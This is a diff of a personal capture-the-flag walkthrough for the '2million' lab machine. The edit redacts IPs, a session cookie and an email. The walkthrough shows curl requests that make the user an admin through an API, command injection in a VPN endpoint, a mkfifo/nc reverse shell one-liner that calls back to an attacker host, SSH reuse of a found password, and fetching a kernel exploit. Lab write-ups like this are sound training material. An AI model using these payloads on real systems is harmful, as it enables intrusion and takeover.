@@ -26,14 +26,14 @@ Enumeration:
 
 5. went to ip, redirected me to http://2million.htb but is having trouble connecting, can't view source code.
 
-6. lets run gobuster to try to get directories associated with this: gobuster dir -u 10.129.229.66 --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+6. lets run gobuster to try to get directories associated with this: gobuster dir -u [victim ip] --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
     - Ip isn't working so let's try the redirect instead this time.
     gobuster dir -u http://2million.htb --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
-        - didn't work, went back to original, excluded 301 redirect code with gobuster dir -u 10.129.229.66 -b 301 --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+        - didn't work, went back to original, excluded 301 redirect code with gobuster dir -u [victim ip] -b 301 --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
         - this worked, scan proceeding
         - nothing returned.
 
-7. added 2million.htb by going to /etc/hosts with sudo vi /etc/hosts and adding in 10.129.229.66    2million.htb under localhost
+7. added 2million.htb by going to /etc/hosts with sudo vi /etc/hosts and adding in [victim ip]    2million.htb under localhost
 8. go back to the webpage, now we can access it, in the meantime lets run our initial nmap scan again now that we have the host.
 9. There's a "login" tab at the top that takes us to a standard /login area , nothing in here so far.
 10. Got to a page /invite which prompts you to hack your way in. searched through the source code and didn't find anything in particular. gonna run gobuster again now that we have the redirects working
@@ -96,10 +96,10 @@ I wonder if I can ssh in now with my new information? Nope.
     - Gonna try to just hit the api end point and see if there are other api's associated.
     - curl -v 2million.htb/api
     - returned unauthorized, so we'll have to provide my cookies from my browser to authenticate
-    - Open browser developer tools, go to storage, grab PHPSESSID: e4sq0090oboluu91u9fq9ee3n8
-    - curl -sv 2million.htb/api --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+    - Open browser developer tools, go to storage, grab PHPSESSID: [cookie]
+    - curl -sv 2million.htb/api --cookie "PHPSESSID=[cookie]" | jq
 
-- 16. returned a new endpoint /api/v1 , gonna hit it the same way as above: curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+- 16. returned a new endpoint /api/v1 , gonna hit it the same way as above: curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=[cookie]" | jq
     - returns a ton of endpoints, including the initial generating an invite code, verifying an invide code, but also has some admin endpoints.
     - "admin": {
       "GET": {
@@ -113,43 +113,43 @@ I wonder if I can ssh in now with my new information? Nope.
       }
     }
 
-    - sent a quick request to the get curl -sv 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+    - sent a quick request to the get curl -sv 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=[cookie]" | jq
         -  returned false, which is expected
     
-    - sent another quick request to curl -X POST -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+    - sent another quick request to curl -X POST -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=[cookie]" | jq
         - returned unauthorized
     
-    - sent another quick request to curl -X PUT -sv 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+    - sent another quick request to curl -X PUT -sv 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=[cookie]" | jq
         - did not get an unauthorized, but did get invalid content type, as in we didn't specify good data to PUT
-        - updated the content type: curl -X PUT --header "Content-Type: application/json" -sv 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+        - updated the content type: curl -X PUT --header "Content-Type: application/json" -sv 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=[cookie]" | jq
         - returned missing parameter: email
-        curl -X PUT --header "Content-Type: application/json" --data '{"email": "rami.hanin@gmail.com"}' -sv 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+        curl -X PUT --header "Content-Type: application/json" --data '{"email": "[email]"}' -sv 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=[cookie]" | jq
         - returns missing parameter: is_admin
-        curl -X PUT --header "Content-Type: application/json" --data '{"email": "rami.hanin@gmail.com", "is_admin": 1}' -sv 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+        curl -X PUT --header "Content-Type: application/json" --data '{"email": "[email]", "is_admin": 1}' -sv 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=[cookie]" | jq
             - returns {
                 "id": 13,
                 "username": "testUser",
                 "is_admin": 1
                 }
 
-17. We're now an admin which is sick. let's check with the /api/v1/admin/auth endpoint curl -sv 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+17. We're now an admin which is sick. let's check with the /api/v1/admin/auth endpoint curl -sv 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=[cookie]" | jq
     - now returns true
     
 
-18. going to try running the post to generate a vpn now, curl -X POST -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
-    - invalid content type, lets update curl -X POST --header "Content-Type: application/json" -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
-    - missing param username: curl -X POST --header "Content-Type: application/json" --data '{"username": "testUser"}' -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" 
+18. going to try running the post to generate a vpn now, curl -X POST -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=[cookie]" | jq
+    - invalid content type, lets update curl -X POST --header "Content-Type: application/json" -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=[cookie]" | jq
+    - missing param username: curl -X POST --header "Content-Type: application/json" --data '{"username": "testUser"}' -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=[cookie]" 
     - Generates a key
 
 19. Since this works, we're gonna try to see if we can use remote code injection since this is usually an admin only endpoint and maybe it's not very secure, instead of passing in a real username, let's pass in some php code AFTER the username, dilineating with ;
     - system('id');
-    curl -X POST --header "Content-Type: application/json" --data '{"username": "test;id;"}' -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" 
+    curl -X POST --header "Content-Type: application/json" --data '{"username": "test;id;"}' -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=[cookie]" 
     returns uid=33(www-data) gid=33(www-data) groups=33(www-data)
     remote code injection is a GO
 
 Gaining a Foothold:
-1. gonna replace id with rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.20 1234 >/tmp/f and run a listener with nc -lvnp 1234 on another terminal
-    - curl -X POST --header "Content-Type: application/json" --data '{"username": "test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.20 1234 >/tmp/f;"}' -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8"
+1. gonna replace id with rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip] 1234 >/tmp/f and run a listener with nc -lvnp 1234 on another terminal
+    - curl -X POST --header "Content-Type: application/json" --data '{"username": "test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip] 1234 >/tmp/f;"}' -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=[cookie]"
     it works, terminal acquired.
 
 2. gonna clean it up and get updated TTY access with python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -166,7 +166,7 @@ Gaining a Foothold:
     - checking /etc/passwd for possible reuse:
         - cat /etc/passwd 
         - admin exists in here, so it's possible we can ssh with the above data 
-        - ssh admin@10.129.229.66 
+        - ssh admin@[victim ip] 
         - password: SuperDuperPass123
 
     - we're in boys.
@@ -190,8 +190,8 @@ Priviledge Escalation:
 4. Google search revealed the github link, https://github.com/xkaneiki/CVE-2023-0386.git , so we're gonna clone this to my home machine and then zip it to upload to our compromised machine.
     - zip -r cve.zip CVE-2023-0386
     - ran sudo python3 -m http.server 8080 on my home server with the cloned repo
-    - went to the compromised machine, ran wget http://10.10.14.20:8080/cve.zip
-    10.10.14.20
+    - went to the compromised machine, ran wget http://[ip]:8080/cve.zip
+    [ip]
     - didn't work, permission denied, but we can try another way.
 
 5. Use SCP to upload straight to the SSH server:
